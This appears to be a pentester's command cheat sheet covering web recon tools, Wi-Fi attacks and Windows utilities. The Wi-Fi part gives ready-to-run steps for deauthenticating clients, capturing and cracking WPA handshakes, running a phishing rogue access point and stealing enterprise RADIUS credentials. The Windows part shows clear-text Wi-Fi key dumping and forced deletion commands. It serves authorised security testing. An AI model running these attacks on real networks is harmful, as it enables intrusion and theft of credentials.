* [Attack Surface Detector](https://portswigger.net/bappstore/47027b96525d4353aea5844781894fb1)
* [Backslash Powered Scanner](https://portswigger.net/bappstore/9cff8c55432a45808432e26dbb2b41d8) **Pro**
* [Collaborator Everywhere](https://portswigger.net/bappstore/2495f6fb364d48c3b6c984e226c02968) **Pro**
* [CSRF Scanner](https://portswigger.net/bappstore/60f172f27a9b49a1b538ed414f9f27c3) **Pro**
* [Freddy, Deserialization Bug Finder](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) **Pro**
* [HTTP Request Smuggler](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
* [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
* [J2EEScan](https://portswigger.net/bappstore/7ec6d429fed04cdcb6243d8ba7358880) **Pro**
* [Java Deserialization Scanner](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae) **Pro**
* [Java Serialized Payloads](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
* [JS Link Finder](https://portswigger.net/bappstore/0e61c786db0c4ac787a08c4516d52ccf) **Pro**
* [JSON Beautifier](https://portswigger.net/bappstore/309ef28d45ff4f19bedfed3896cb3ca9)
* [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
* [Logger++](https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81)
* [SQLiPy Sqlmap Integration](https://portswigger.net/bappstore/f154175126a04bfe8edc6056f340f52e)
* [SSL Scanner](https://portswigger.net/bappstore/474b3c575a1a4584aa44dfefc70f269d)
* [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f) **Pro**
* [WordPress Scanner](https://portswigger.net/bappstore/77a12b2966844f04bba032de5744cd35)

GitHub:

* [Femida XSS](https://github.com/wish-i-was/femida)
* [SHELLING](https://github.com/ewilded/shelling)
* [Burp Vulners Scanner](https://github.com/vulnersCom/burp-vulners-scanner)
* [HackBar](https://github.com/d3vilbug/HackBar)




## Tools



### gobuster

* [https://github.com/OJ/gobuster/releases](https://github.com/OJ/gobuster/releases)

```
$ gobuster dir -ku 'https://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
$ gobuster dir -ku 'https://127.0.0.1' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words[-lowercase].txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
```



### wfuzz

* [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
* [https://wfuzz.readthedocs.io/en/latest/](https://wfuzz.readthedocs.io/en/latest/)

```
$ wfuzz -e encoders
$ wfuzz -c -u 'http://10.10.13.37/index.php?id=FUZZ' -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -f wfuzz.out --hh 1337
$ wfuzz -c -u 'http://10.10.13.37' --basic 'FUZZ:FUZ2Z' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --hc 1337
```



### aquatone

* [https://github.com/michenriksen/aquatone/releases](https://github.com/michenriksen/aquatone/releases)

Default ports:

```
$ cat targets.txt | ./aquatone -ports 80,443,8000,8080,8443 -out 10.0-255.0-255.0-255
```

From Nmap XML:

```
$ ports=`cat nmap/tcp.gnmap | grep -ioP '\d+/open/tcp//http' | awk -F/ '{print $1}' | sort -u | awk 1 ORS=',' | sed 's/.$//'`
$ cat targets.txt | ./aquatone -ports $ports -out 10.0-255.0-255.0-255_nmap
Or
$ cat nmap/tcp.xml | ./aquatone -out 10.0-255.0-255.0-255_nmap
```



### amass

* [https://github.com/OWASP/Amass/releases](https://github.com/OWASP/Amass/releases)
* [https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html](https://snovvcrash.github.io/2020/05/10/subdomain-discovery.html)

```
$ amass intel -active -config config.ini -whois -df domains.txt -ipv4 -src -v -o intel.out
$ amass enum -active -brute -config config.ini -df domains.txt -ipv4 -src -v -o enum.out
```



### subfinder

* [https://github.com/projectdiscovery/subfinder/releases](https://github.com/projectdiscovery/subfinder/releases)

```
$ subfinder -all -config config.yaml -d hackerone.com -o subdomains.txt [-oI -nW]
```



### shuffledns

* [https://github.com/projectdiscovery/shuffledns/releases](https://github.com/projectdiscovery/shuffledns/releases)

```
$ shuffledns -d hackerone.com -r /opt/dnsvalidator/resolvers.txt -w /usr/share/commonspeak2-wordlists/subdomains/subdomains.txt -o subdomains.txt -t 500
```



### massdns

* [https://github.com/blechschmidt/massdns](https://github.com/blechschmidt/massdns)
* [https://github.com/vortexau/dnsvalidator](https://github.com/vortexau/dnsvalidator)

```
$ massdns -r /opt/dnsvalidator/resolvers.txt domains.txt -w domains-resolved.txt -o S
```



### chaos

* [https://github.com/projectdiscovery/chaos-client](https://github.com/projectdiscovery/chaos-client)

```
$ chaos -d megacorp.com -key <API_KEY> -http-status-code -http-title -http-url -o chaos.out
```



### nuclei

* [https://github.com/projectdiscovery/nuclei/releases](https://github.com/projectdiscovery/nuclei/releases)

```
$ nuclei -update-templates
$ nuclei -l domains.txt -t cves/ -o nuclei.out
```



### httpx

* [https://github.com/projectdiscovery/httpx/releases](https://github.com/projectdiscovery/httpx/releases)

```
$ httpx -l domains.txt -vhost -http2 -pipeline -title -content-length -status-code -follow-redirects -tls-probe -content-type -location -csp-probe -web-server -stats -ip -cname -cdn -ports 80,81,300,443,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017 -threads 300 -o httpx.out
```



### nikto

* [https://github.com/sullo/nikto](https://github.com/sullo/nikto)

```
$ nikto -h http://127.0.0.1 -Cgidirs all
```





# Wi-Fi

* [https://www.aircrack-ng.org/doku.php?id=newbie_guide](https://www.aircrack-ng.org/doku.php?id=newbie_guide)
* [https://defkey.com/airodump-ng-shortcuts](https://defkey.com/airodump-ng-shortcuts)
* [https://xakep.ru/2020/01/27/wifi-total-pwn/](https://xakep.ru/2020/01/27/wifi-total-pwn/)




## Hardware



### TP-Link TL-WN722N v2/v3

* [https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9](https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9)
* [https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/](https://codeby.net/threads/gajd-2020-po-zapusku-rezhima-monitora-v-tp-link-tl-wn722n-v2-v3-kali-linux-wardriving.70594/)

Chipset: TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS].

Check kernel version:

```
$ uname -r
5.8.0-kali2-amd64
```

Install kernel headers:

```
$ sudo apt install -y bc linux-headers-amd64
```

Build drivers from source and install:

```
$ sudo -i
 # echo "blacklist r8188eu" >> "/etc/modprobe.d/realtek.conf"
 # git clone https://github.com/aircrack-ng/rtl8188eus/tree/v5.3.9 /opt/rtl8188eus && cd /opt/rtl8188eus
 # make && make install
 # reboot
```

Test for packet injections:

```
$ sudo aireplay-ng -9 wlan1
```



### Alfa AWUS036ACH AC1200

* [https://github.com/aircrack-ng/rtl8812au](https://github.com/aircrack-ng/rtl8812au)

Chipset: Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter.

Install drivers with apt:

```
$ sudo apt update && sudo apt upgrade -y
$ sudo apt install realtek-rtl88xxau-dkms
$ sudo reboot
```

Or build from source and install:

```
$ sudo -i
 # git clone https://github.com/aircrack-ng/rtl8812au /opt/rtl8812au && cd /opt/rtl8812au
 # ./dkms-install.sh
 # reboot
```

Test for packet injections:

```
$ sudo aireplay-ng -9 wlan1
```




## Prologue

Install stuff:

```
$ sudo apt install lshw cowpatty -y
```

Make sure lsusb can see the wireless adapters (it would show the chipset):

```
$ lsusb
Bus 001 Device 003: ID 2357:010c TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]
Bus 001 Device 010: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
```

Make sure iwconfig can see the wireless adapter:

```
$ sudo ifconfig
$ sudo iwconfig
$ sudo iw dev
```

Turn on monitor mode manually:

```
$ sudo ip link set wlan1 down
$ sudo iwconfig wlan1 mode monitor
$ sudo ip link set wlan1 up
$ sudo iwconfig
```

Undo:

```
$ sudo ip link set wlan1 down
$ sudo iwconfig wlan1 mode managed
$ sudo ip link set wlan1 up
$ sudo iwconfig
```

Or create a separate virtual interface in monitor mode:

```
$ sudo ip link set wlan1 down
$ sudo iw dev wlan1 interface add wlan1mon type monitor
$ sudo ip link set wlan1 up
$ sudo service NetworkManager restart
$ sudo iwconfig
```

Undo:

```
$ sudo ip link set wlan1 down
sudo iw dev wlan1mon del
sudo ip link set wlan1 up
sudo iwconfig
```

Or do it with airmon-ng:

```
$ sudo airmon-ng start wlan1
```

In fact, that does not need to be done as airodump-ng can put the wireless card into monitor mode automatically:

```
$ sudo airodump wlan1
```

Make sure, you're not using the default MAC:

```
$ macchanger -s wlan1
```

Restart NM when there are troubles with Internet connection:

```
$ sudo service NetworkManager restart
```




## WPA/WPA2



### Personal


#### 4-Way Handshake

* [https://www.wifi-professionals.com/2019/01/4-way-handshake](https://www.wifi-professionals.com/2019/01/4-way-handshake)
* [https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work](https://security.stackexchange.com/questions/66008/how-exactly-does-4-way-handshake-cracking-work)
* [https://www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
* [https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng](https://security.stackexchange.com/questions/111527/no-handshake-recorded-from-airodump-ng)
* [https://hackware.ru/?p=74](https://hackware.ru/?p=74)
* [https://hackware.ru/?p=7542](https://hackware.ru/?p=7542)
* [https://hackware.ru/?p=5209](https://hackware.ru/?p=5209)

1\. Look for targets. Save BSSID (`00:00:00:00:00:01`), CH (`9`), ESSID (`SomeEssid`) and STATION (`00:00:00:00:00:02`) if deauth will be required:

```
$ sudo airodump-ng -M -U wlan1 [-c 36-165 (for 5GHz, see WLAN channels) or just -c 1-200 for all] [--band <abg>]
qq
```

2\. Start dumping the target's traffic:

```
[$ sudo iwconfig wlan1 channel 9]
$ sudo airodump-ng -c 9 --bssid 00:00:00:00:00:01 -w SomeEssid wlan1
```

3\. Send DeAuth packets in a separate terminal till `WPA handshake: XX:XX:XX:XX:XX:XX` appears (aggressive):

```
$ sudo aireplay-ng [-D] -0 2 -a 00:00:00:00:00:01 -c 00:00:00:00:00:02 wlan1
Or
$ for client in `cat 00:00:00:00:00:01.txt`; do sudo aireplay-ng -D -0 2 -a 00:00:00:00:00:01 -c $client wlan1; done
```

4\. Clean the capture, check it once again, covert to Hashcat format and crack it:

```
$ aircrack-ng SomeEssid*.cap
$ wpaclean SomeEssid-cleaned.cap SomeEssid-01.cap
$ cowpatty -r SomeEssid-cleaned.cap -s SomeEssid -c
$ /usr/lib/hashcat-utils/cap2hccapx.bin SomeEssid-cleaned.cap SomeEssid.hccapx
$ hashcat -m 2500 -a 0 cleaned.hccapx rockyou.txt
```

##### wifite2

```
$ sudo wifite -vi wlan1 --clients-only --wpa --no-wps
```


#### PMKID

* [https://https://habr.com/ru/company/jetinfosystems/blog/419383/](https://habr.com/ru/company/jetinfosystems/blog/419383/)

##### wifite2

```
$ sudo wifite -vi wlan1 --pmkid
```


#### wifite2

* [https://github.com/derv82/wifite2](https://github.com/derv82/wifite2)
* [https://github.com/nuncan/wifite2mod](https://github.com/nuncan/wifite2mod)

> «Поэтому оптимальный алгоритм взло… аудита следующий: определяем, включен ли на целевой точке доступа режим WPS. Если да, запускаем PixieDust. Безуспешно? Тогда перебор известных пинов. Не получилось? Проверяем, не включено ли шифрование WEP, которое тоже обходится влет. Если нет, то выполняем атаку PMKID на WPA(2). Если уж и так не получилось, тогда вспоминаем классику и ждем хендшейка (чтобы не палиться) или активно кикаем клиентов, чтобы наловить их сессии авторизации.» — [\]\[](https://xakep.ru/2020/01/27/wifi-total-pwn/)

Install wifite2:

```
$ git clone https://github.com/derv82/wifite2 ~/tools/wifite2 && cd ~/tools/wifite2
$ sudo python setup.py install
```

Install hcxdumptool (for capturing PMKID hashes):

```
$ git clone https://github.com/ZerBea/hcxdumptool.git ~/tools/hcxdumptool && cd ~/tools/hcxdumptool
$ sudo apt install libcurl4-openssl-dev libssl-dev -y
$ make
$ sudo make install
```

Install (for converting PMKID packet captures into hashcat's format):

```
$ git clone https://github.com/ZerBea/hcxtools.git ~/tools/hcxtools && cd ~/tools/hcxtools
$ make
$ sudo make install
```

Fire up wifite2:

```
$ sudo wifite -vi wlan1 [--kill] [-5]
```


#### airgeddon

* [https://github.com/v1s1t0r1sh3r3/airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon)

```
$ git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git ~/tools/airgeddon && cd ~/tools/airgeddon
$ sudo bash airgeddon.sh
```


#### wifiphisher

* [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher)
* [Creating a custom phishing scenario · wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher/blob/5ae21ab93e0dce85dd4bf76e68cc3b996aa33dea/docs/custom_phishing_scenario.rst)

Install:

```
$ git clone https://github.com/wifiphisher/wifiphisher.git ~/tools/wifiphisher && cd ~/tools/wifiphisher
$ sudo python3 setup.py install # Install any dependencies
```

Start a rogue AP with fake captive portal (firmware update scenario) on wlan1 and deauth clients with wlan2:

```
$ sudo wifiphisher -aI wlan1 -eI wlan2 -p wifi_connect
```



### Enterprise

* [https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2](https://medium.com/@adam.toscher/top-5-ways-i-gained-access-to-your-corporate-wireless-network-lo0tbo0ty-karma-edition-f72e7995aef2)


#### hostapd-wpe

* [https://pentest.blog/attacking-wpa-enterprise-wireless-network/](https://pentest.blog/attacking-wpa-enterprise-wireless-network/)
* [https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html](https://teckk2.github.io/wifi%20pentesting/2018/08/09/Cracking-WPA-WPA2-Enterprise.html)
* [https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/](https://codeby.net/threads/vzlom-wpa-2-enterprise-s-pomoschju-ataki-evil-twin.59920/)

1\. Install dependencies:

```
$ sudo apt install libnl-3-dev libssl-dev
$ sudo apt install hostapd-wpe
```

2\. Install and configure hostapd-wpe:

```
$ sudo vi /etc/hostapd-wpe/hostapd-wpe.conf
...
interface=wlan1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ssid=NotEvilTwinAP
channel=1
hw_mode=b
auth_server_addr=127.0.0.1
auth_server_port=18120
auth_server_shared_secret=S3cr3t!
wpa_pairwise=TKIP CCMP
```

3\. Run fake AP with RADIUS server

```
$ sudo airmon-ng check kill
$ sudo /usr/sbin/hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

4\. Crack Net-NTLM hashes (mask example)

```
$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l ?1?1?1?1?1?1?1?1
$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l?u ?1?1?1?1?1?1?1?1
$ hashcat -m 5500 -a 3 net-ntlmv1.txt -1 ?d?l?u?s ?1?1?1?1?1?1?1?1
```


#### apd_launchpad

* [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)
* [https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html](https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html)

```
$ python ~/tools/apd_launchpad/apd_launchpad.py -t radius -s MegaCorp -i wlan1 -ch 1 -cn '*.megacorp.local' -o MegaCorp
$ vi radius/radius.conf
...
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
```


#### EAPHammer

* [https://github.com/s0lst1c3/eaphammer](https://github.com/s0lst1c3/eaphammer)

Setup:

```
$ git clone https://github.com/s0lst1c3/eaphammer.git ~/tools/eaphammer && cd ~/tools/eaphammer
$ sudo ./kali-setup
$ sudo python3 -m pip install flask-cors flask-socketio --upgrade
```

Create a certificate:

```
$ sudo ./eaphammer --cert-wizard
```

Steal RADIUS creds:

```
$ sudo ./eaphammer --bssid 1C:7E:E5:97:79:B1 --essid Example --channel 1 --interface wlan1 --auth wpa-eap --creds
```




## Misc



### WLAN channels

* [https://en.wikipedia.org/wiki/List_of_WLAN_channels](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
* [https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png](https://www.ekahau.com/wp-content/uploads/2020/05/unlicensed-spectrum-and-channel-allocations_6-ghz.png)



### Signal Strength

* [https://eyesaas.com/wi-fi-signal-strength/](https://eyesaas.com/wi-fi-signal-strength/)





# Windows




## Processes

Kill process from cmd:

```
Cmd > taskkill /f /im:calc.exe
```




## Secure Delete



### cipher

```
Cmd > cipher /w:H
```



### sdelete

File:

```
Cmd > sdelete -p 7 testfile.txt
```

Directory (recursively):

```
Cmd > sdelete -p 7 -r "C:\temp"
```

Disk or partition:

```
Cmd > sdelete -p 7 -c H:
```




## System Perfomance

```
Cmd > perfmon /res
```




## Network



### Connections and Routes

```
Cmd > netstat -b
Cmd > netstat -ano
Cmd > route print [-4]
```



### Clean Cache

```
Cmd > netsh int ip reset
Cmd > netsh int tcp reset
Cmd > ipconfig /flushdns
Cmd > netsh winsock reset
Cmd > route -f
[Cmd> ipconfig -renew]
```

Hide/unhide computer name on LAN:

```
Cmd > net config server
Cmd > net config server /hidden:yes
Cmd > net config server /hidden:no
(+ reboot)
```




## Symlinks

```
Cmd > mklink Link <FILE>
Cmd > mklink /D Link <DIRECTORY>
```




## Wi-Fi Credentials

* [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)

```
> netsh wlan show profiles
> netsh wlan show profiles "ESSID" key=clear
```




## Installed Software

```
PS > Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > InstalledSoftware.txt
```




## ADS

```
PS > Get-Item 'file.txt' -Stream *
PS > Get-Content 'file.txt' -Stream Password
Or
PS > type 'file.txt:Password'
```




## .msc

```
secpol.msc  -- "Local Security Policy" -- «Локальная политика безопасности»
gpedit.msc  -- "Local Group Policy Editor" -- «Редактор локальной групповой политики»
lusrmgr.msc -- "Local Users and Groups (Local)" -- «Локальные пользователи и группы (локально)»
certmgr.msc -- "Certificates - Current User" -- «Сертификаты - текущий пользователь»
```




## KRShowKeyMgr

Run:

```
rundll32.exe keymgr.dll, KRShowKeyMgr
```




## Permissions

Take own of a directory and remove it (run cmd.exe as admin):

```
Cmd > takeown /F C:\$Windows.~BT\* /R /A 
Cmd > icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
Cmd > rmdir /S /Q C:\$Windows.~BT\
```




## DISM



### TelnetClient

```
Cmd > DISM /online /Enable-Feature /FeatureName:TelnetClient
```




## BitLocker

Check encryption status of all drives (must be elevated):

```
Cmd > manage-bde -status
```
